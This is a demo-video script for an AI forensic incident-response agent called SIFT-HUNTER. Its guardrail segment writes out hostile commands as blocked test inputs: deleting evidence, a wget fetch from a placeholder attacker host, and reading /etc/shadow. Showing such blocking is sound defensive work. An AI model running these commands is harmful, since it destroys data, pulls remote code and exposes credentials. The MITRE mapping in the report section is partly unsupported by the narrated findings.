# SIFT-HUNTER Demo Script
## SANS FIND EVIL! Hackathon — 5-Minute Demo Video

---

### Pre-Demo Setup Checklist

Before recording:
- [ ] Terminal font size: 18pt minimum (readable on small screens)
- [ ] Split terminal: left = agent output, right = audit trail viewer
- [ ] Evidence files staged at `/cases/demo/` (disk.dd + memory.dmp)
- [ ] `ANTHROPIC_API_KEY` exported
- [ ] `VT_API_KEY` exported (for hash enrichment demo)
- [ ] Rich terminal output enabled (colorized)
- [ ] Audio recording test done

---

## 00:00 — 00:30 | HOOK: The Problem

**[Camera on terminal. Show a news headline or blank screen. Speak directly.]**

> "Modern attackers compromise a Windows endpoint in under 7 minutes. A human analyst reviewing the same endpoint takes 2-4 hours just to enumerate artifacts. By the time the analyst finishes, the attacker has moved laterally to three more hosts.
>
> SIFT-HUNTER closes that gap. It's an autonomous AI incident response agent that runs on your SIFT Workstation, analyzes disk and memory evidence, self-corrects its own findings, and produces a verified incident report — in minutes."

---

## 00:30 — 01:00 | ARCHITECTURE OVERVIEW

**[Show the ASCII diagram from README.md or a clean slide]**

> "The system has two main components. First, a Custom MCP Server — this is the security boundary. It wraps all forensic tools with architectural read-only enforcement. The LLM cannot execute `rm`, `dd`, `wget`, or `curl`. It's not a prompt that says 'please don't delete things.' It's Python code that makes those operations structurally impossible.
>
> Second, a LangGraph multi-agent system with six specialized agents: Triage, Disk Analyst, Memory Analyst, Correlator, Verifier, and Reporter. The Verifier is the tiebreaker — it catches hallucinations and routes findings back for correction."

---

## 01:00 — 01:15 | LAUNCH

**[Type command live in terminal]**

```bash
sift-hunter analyze /cases/demo/disk.dd /cases/demo/memory.dmp \
  --output /cases/demo/report.md
```

**[Speak as it initializes]**

> "One command. Two evidence files — a disk image and a memory capture. The system hashes both files for integrity and begins triage."

---

## 01:15 — 01:45 | TRIAGE PHASE

**[Show Rich terminal output as Triage agent runs]**

> "The Triage agent inventories both evidence files, identifies the OS as Windows 10, and creates an analysis plan prioritizing disk artifacts first — MFT, Prefetch, Registry — then memory for process correlation."

**[Point to the hashing output]**

> "Every evidence file is SHA256 hashed. The hash is logged to the audit trail. If anyone tampers with the evidence between now and your court date, you'll know."

---

## 01:45 — 02:30 | DISK ANALYSIS

**[Show disk analyst output scrolling]**

> "The Disk Analyst runs seven tools in sequence: MFT analysis, Prefetch parsing, registry hive analysis, USN Journal, ShellBags, Amcache, and timeline generation.

**[Point to a finding appearing on screen]**

> "Here — MFT analysis found timestomping. The file `svchost_helper.exe` in `AppData\Local\Temp` has a $STANDARD_INFORMATION creation timestamp that's two days EARLIER than its $FILE_NAME timestamp. That's the signature of an attacker trying to make a recently-dropped file look old. Confidence: PROBABLE."

**[Point to a second finding]**

> "Prefetch shows `MSHTA.EXE` executed at 14:23 on January 15th. That's a LOLBin — Microsoft HTML Application Host — commonly used for phishing payload execution. And the registry found a Run key added that same minute. Execution followed immediately by persistence."

---

## 02:30 — 03:00 | MEMORY ANALYSIS

**[Show memory analyst output]**

> "Now memory. Volatility3 shows a process named `svchost.exe` running from `C:\Users\victim\AppData\Local\Temp` — that's process masquerading. Real svchost lives in System32. Parent process is `winword.exe`. Word spawning a fake svchost. Classic spear-phishing execution chain.

**[Point to network connections]**

> "And it has an established TCP connection to 45.137.21.9 on port 4444. That's the default Metasploit listener port, and SIFT-HUNTER enriches the address against VirusTotal and AbuseIPDB for reputation."

---

## 03:00 — 03:30 | **THE TIEBREAKER: SELF-CORRECTION**

**[This is the key moment — make it dramatic]**

> "Now here's what makes SIFT-HUNTER different. The Verifier agent reviews every finding against the raw tool output.

**[Show the verifier output — a correction appearing]**

> "Watch this. The Disk Analyst claimed the malware was located at `C:\Windows\System32\evil.exe`. But the Verifier checked — that path doesn't appear in any tool output. The MFT, Prefetch, and Registry all show `AppData\Local\Temp`. The Disk Analyst hallucinated the path.

**[Show the correction being created and the agent routing back]**

> "The Verifier creates a Correction record, logs it to the audit trail, and routes the finding back to the Disk Analyst with specific correction instructions: 're-examine the file path claim.'

**[Show the corrected finding appearing]**

> "The Disk Analyst re-runs with the correction context and produces the accurate finding: `AppData\Local\Temp\svchost_helper.exe`. Confidence now CONFIRMED — it matches across MFT, Prefetch, and memory.

**[Speak firmly]**

> "That self-correction just prevented an inaccurate finding from appearing in a forensic report. In an actual incident, that mistake could waste hours of response time — or worse, it goes to court. The system caught itself."

---

## 03:30 — 04:00 | SECURITY GUARDRAILS DEMO

**[Open a new terminal tab]**

```bash
# Try to make the agent run destructive commands
sift-hunter check "rm -rf /cases/evidence"
```

**[Show BLOCKED output]**

> "Blocked. Architecturally."

```bash
sift-hunter check "wget http://attacker.com/exfil.sh"
```

> "Blocked. No network egress."

```bash
sift-hunter check "bash -c 'cat /etc/shadow'"
```

> "Blocked. No shell spawning."

```bash
sift-hunter check "vol3 -f /cases/demo/memory.dmp windows.pslist.PsList"
```

> "Allowed. Read-only forensic tool. This is the design — anything that reads evidence is allowed, anything that could modify or exfiltrate is blocked at the Python layer before the LLM ever sees it."

---

## 04:00 — 04:30 | AUDIT TRAIL

**[Copy a finding-id from the output]**

```bash
sift-hunter audit <finding-id>
```

**[Show the evidence chain output]**

> "Every finding is fully traceable. This shows the exact tool execution that produced the evidence, the raw output, the agent that made the claim, the timestamp, and if there were corrections — the full correction history.

> For legal defensibility, for peer review, for understanding why the AI said what it said — it's all here. Nothing is a black box."

---

## 04:30 — 04:45 | FINAL REPORT

**[Show the generated markdown report briefly]**

> "The final report includes: executive summary, detailed findings with evidence citations, MITRE ATT&CK mapping — this case triggered T1059.001 PowerShell, T1547.001 Registry Run Key, T1055 Process Injection, T1071 C2 over standard protocols — and a self-assessment section where the system explicitly lists what it's uncertain about.

> We don't hide uncertainty. CONFIRMED findings have two sources. POSSIBLE findings are labeled as such. The report tells you what to investigate next, not just what was found."

---

## 04:45 — 05:00 | CLOSE

> "SIFT-HUNTER: the forensic analyst that works at 3 AM, doesn't hallucinate silently, and shows its work.

> Custom MCP Server for architectural security. Multi-agent orchestration for specialized expertise. A Verifier that catches its own mistakes. A complete audit trail from finding to raw evidence.

> Fork it, add your tools, deploy it on your SIFT Workstation. The code is at [github link], MIT licensed, one-command install."

---

## Backup Talking Points

*If something goes wrong during the demo:*

- **If the LLM is slow:** "This is running against real evidence. Production would pre-stage tool outputs for the demo — the architecture is identical."
- **If a tool is missing:** "On SIFT Workstation all these tools come pre-installed. In this environment I'm showing the output parsing layer."
- **If asked about cost:** "Claude Opus handles all 6 agents. A full analysis of a 10GB disk image + 4GB memory capture runs approximately 150k tokens — about $2.25 at current pricing."
- **If asked about scale:** "The MCP server is stateless. Run 10 agents against 10 evidence sets in parallel. LangGraph supports distributed execution."

---

## Key Phrases to Hit (Judging Rubric)

- "Architecturally read-only — not prompt-based" ← Criterion 4
- "Self-correction on screen" ← Criterion 1 TIEBREAKER
- "CONFIRMED requires 2+ independent sources" ← Criterion 2
- "Every finding traceable to raw tool output" ← Criterion 5
- "Fork → add tool → under 60 minutes" ← Criterion 6
- "MFT, Prefetch, Registry, USN, ShellBags, Volatility" ← Criterion 3
